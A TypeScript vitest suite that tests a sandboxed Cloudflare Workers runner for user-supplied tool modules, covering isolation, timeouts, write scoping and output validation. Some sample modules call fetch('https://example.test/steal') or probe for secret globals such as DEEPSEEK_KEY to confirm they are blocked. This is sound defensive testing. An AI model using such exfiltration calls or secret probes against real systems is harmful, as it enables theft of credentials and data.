import { env } from 'cloudflare:workers';
import { describe, expect, it, vi } from 'vitest';
import { createCloudflareToolBehaviorRunner } from './tool-behavior-runner.js';
import {
  TOOL_BEHAVIOR_LIMITS,
  validateToolBehaviorOutput,
  type ToolBehaviorProposedChange,
  type ToolBehaviorRequest,
} from '../src/tabletop/shared/tool-behavior.js';
import { TOOL_PACKAGE_RUNTIME_PROFILE } from '../src/tabletop/shared/tool-package.js';

const bindings = env as { COMPUTE_LOADER: WorkerLoader };

const createChange = (values: Record<string, string | number | boolean | null> = { room: 'Studio', area: 12 }): ToolBehaviorProposedChange =>
  ({ target: 'self', resource: 'allocations', operation: 'create', values });

const request: ToolBehaviorRequest = {
  packageId: 'activity-layout',
  packageVersion: 1,
  contentHash: 'c'.repeat(64),
  runtimeProfile: TOOL_PACKAGE_RUNTIME_PROFILE,
  moduleSource: 'export function allocate(inputs) { return [{target:"self",resource:"allocations",operation:"create",values:{room:inputs.room,area:12}}]; }',
  entry: 'allocate',
  inputs: { room: 'Studio' },
  declaredWrites: [{ target: 'self', resource: 'allocations', operations: ['create'], maxRows: 20 }],
  resourceSchema: { allocations: { fields: [{ id: 'room', type: 'text' }, { id: 'area', type: 'number' }] } },
  expected: { instanceRevision: 1, grantVersion: 1 },
};

const runner = (): ReturnType<typeof createCloudflareToolBehaviorRunner> => createCloudflareToolBehaviorRunner({ loader: bindings.COMPUTE_LOADER });

describe('real isolated tool behaviour', () => {
  it('runs a declared behaviour and returns its proposed changes', async () => {
    const result = await runner().run(request);
    expect(result.output).toEqual([createChange()]);
    expect(validateToolBehaviorOutput(result, request)).toEqual({ ok: true, changes: [createChange()] });
  });

  it('does not retain generated module state across invocations', async () => {
    const counting: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'let calls = 0; export function allocate() { return [{target:"self",resource:"allocations",operation:"create",values:{room:"run",area:++calls}}]; }',
    };
    expect((await runner().run(counting)).output[0]?.values?.area).toBe(1);
    expect((await runner().run(counting)).output[0]?.values?.area).toBe(1);
  });

  it('reports a thrown behaviour as TOOL_BEHAVIOR_FAILED, not as a partial result', async () => {
    const failing: ToolBehaviorRequest = { ...request, moduleSource: 'export function allocate() { throw new Error("boom"); }' };
    await expect(runner().run(failing)).rejects.toMatchObject({ name: 'ToolBehaviorRunError', code: 'TOOL_BEHAVIOR_FAILED' });
  });

  it('rejects a behaviour that proposes a write outside its declared set', async () => {
    const overreach: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export function allocate() { return [{target:"self",resource:"invoices",operation:"create",values:{room:"x"}}]; }',
    };
    const result = await runner().run(overreach);
    const validated = validateToolBehaviorOutput(result, request);
    expect(validated.ok).toBe(false);
    if (validated.ok) throw new Error('the out-of-scope write was accepted');
    expect(validated.code).toBe('TOOL_WRITE_OUT_OF_SCOPE');
    expect(validated.problems.join(' ')).toContain('self/invoices');
  });

  it('refuses fetch() inside the isolate and never lets the network call complete', async () => {
    // The module only answers with a change if the request completes; a denied fetch throws
    // through to the entry, so a resolved run is proof the sandbox could reach the network.
    const network: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export async function allocate() { await fetch("https://example.test/steal"); return [{target:"self",resource:"allocations",operation:"create",values:{room:"reached",area:1}}]; }',
    };
    await expect(runner().run(network)).rejects.toMatchObject({ code: 'TOOL_BEHAVIOR_FAILED' });
  });

  it('lets a behaviour observe only the denial of its fetch attempt', async () => {
    const caught: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export async function allocate() { try { await fetch("https://example.test/steal"); return [{target:"self",resource:"allocations",operation:"create",values:{room:"network",area:1}}]; } catch { return [{target:"self",resource:"allocations",operation:"create",values:{room:"denied",area:0}}]; } }',
    };
    const result = await runner().run(caught);
    expect(result.output[0]?.values?.room).toBe('denied');
  });

  it('stops a behaviour that never returns with TOOL_BEHAVIOR_TIMEOUT', async () => {
    // A bare never-settling promise is aborted by workerd itself ("would never generate a
    // response"), so the pending work is a long timer: the run stays alive until the host's
    // own wall clock ends it, which is the behaviour this test proves.
    const hanging: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export async function allocate() { await new Promise(resolve => setTimeout(resolve, 60000)); return []; }',
    };
    const started = Date.now();
    await expect(runner().run(hanging)).rejects.toMatchObject({ code: 'TOOL_BEHAVIOR_TIMEOUT' });
    expect(Date.now() - started).toBeGreaterThanOrEqual(TOOL_BEHAVIOR_LIMITS.timeoutMs - 250);
    expect(Date.now() - started).toBeLessThan(15_000);
  }, 20_000);

  it('gives the isolate no env binding or secret-looking global', async () => {
    const probe: ToolBehaviorRequest = {
      ...request,
      moduleSource: `export function allocate() {
        const names = ["env", "DB", "DEEPSEEK_KEY", "PUBLIC_ORIGIN", "GOOGLE_OAUTH_CLIENT_SECRET", "COMPUTE_LOADER"];
        return [{target:"self",resource:"probe",operation:"create",values:{seen:names.map(name => name + "=" + typeof globalThis[name]).join(";")}}];
      }`,
      declaredWrites: [{ target: 'self', resource: 'probe', operations: ['create'], maxRows: 1 }],
      resourceSchema: { probe: { fields: [{ id: 'seen', type: 'text' }] } },
    };
    const result = await runner().run(probe);
    expect(result.output[0]?.values?.seen).toBe(
      'env=undefined;DB=undefined;DEEPSEEK_KEY=undefined;PUBLIC_ORIGIN=undefined;GOOGLE_OAUTH_CLIENT_SECRET=undefined;COMPUTE_LOADER=undefined',
    );
    // The vitest config binds PUBLIC_ORIGIN to this value in the host Worker; the isolate must
    // not be able to echo it back even indirectly.
    expect(JSON.stringify(result.output)).not.toContain('tabletop.test');
    expect(validateToolBehaviorOutput(result, probe).ok).toBe(true);
  });

  it('rejects a non-finite number and an oversized output as TOOL_OUTPUT_INVALID', async () => {
    const nonFinite: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export function allocate() { return [{target:"self",resource:"allocations",operation:"create",values:{room:"x",area:NaN}}]; }',
    };
    await expect(runner().run(nonFinite)).rejects.toMatchObject({ code: 'TOOL_OUTPUT_INVALID' });
    const oversized: ToolBehaviorRequest = {
      ...request,
      moduleSource: 'export function allocate() { return [{target:"self",resource:"allocations",operation:"create",values:{room:"x".repeat(70000),area:1}}]; }',
    };
    await expect(runner().run(oversized)).rejects.toMatchObject({ code: 'TOOL_OUTPUT_INVALID' });
  });

  it('never starts an isolate for a request the contract rejects', async () => {
    const oversizedSource: ToolBehaviorRequest = { ...request, moduleSource: 'x'.repeat(TOOL_BEHAVIOR_LIMITS.maxModuleChars + 1) };
    await expect(runner().run(oversizedSource)).rejects.toMatchObject({ code: 'TOOL_BEHAVIOR_FAILED' });
    await expect(runner().run(request, AbortSignal.abort())).rejects.toMatchObject({ code: 'TOOL_BEHAVIOR_TIMEOUT' });
  });

  it('fails closed when the loader binding is unavailable', async () => {
    const warning = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    try {
      await expect(createCloudflareToolBehaviorRunner({}).run(request)).rejects.toMatchObject({ code: 'TOOL_BEHAVIOR_UNAVAILABLE' });
      expect(warning).toHaveBeenCalledWith('TABLE_TOOL_BEHAVIOR_UNAVAILABLE', { reason: 'loader_binding_missing' });
    } finally {
      warning.mockRestore();
    }
  });
});

/**
 * F080 / ORACLE-01 (server behaviour surface): the runner's proposal is compared with a change the
 * test builds itself, so a drift in how inputs are passed to the module shows up as a difference.
 */
describe('behaviour output against an independent expectation', () => {
  it('agrees with an expectation computed in the test', async () => {
    const room = 'Atrium';
    const area = 30;
    // The expected change is written here, from the module's intent, not produced by the runner.
    const expected = [{ target: 'self', resource: 'rooms', operation: 'create', values: { room, area } }];
    const result = await runner().run({
      ...request,
      moduleSource: 'export function allocate(inputs) { return [{target:"self",resource:"rooms",operation:"create",values:{room:inputs.room,area:inputs.area}}]; }',
      inputs: { room, area },
      declaredWrites: [{ target: 'self', resource: 'rooms', operations: ['create'], maxRows: 5 }],
      resourceSchema: { rooms: { fields: [{ id: 'room', type: 'text' }, { id: 'area', type: 'number' }] } },
    });
    expect(result.output).toEqual(expected);
  });

  it('passes a numeric input through unchanged, without turning it into text', async () => {
    const result = await runner().run({
      ...request,
      moduleSource: 'export function allocate(inputs) { return [{target:"self",resource:"rooms",operation:"create",values:{room:String(inputs.room),area:inputs.area}}]; }',
      inputs: { room: 'Atrium', area: 12.5 },
      declaredWrites: [{ target: 'self', resource: 'rooms', operations: ['create'], maxRows: 5 }],
      resourceSchema: { rooms: { fields: [{ id: 'room', type: 'text' }, { id: 'area', type: 'number' }] } },
    });
    const change = (result.output as { values: { area: unknown } }[])[0];
    expect(change?.values.area).toBe(12.5);
    expect(typeof change?.values.area).toBe('number');
  });
});
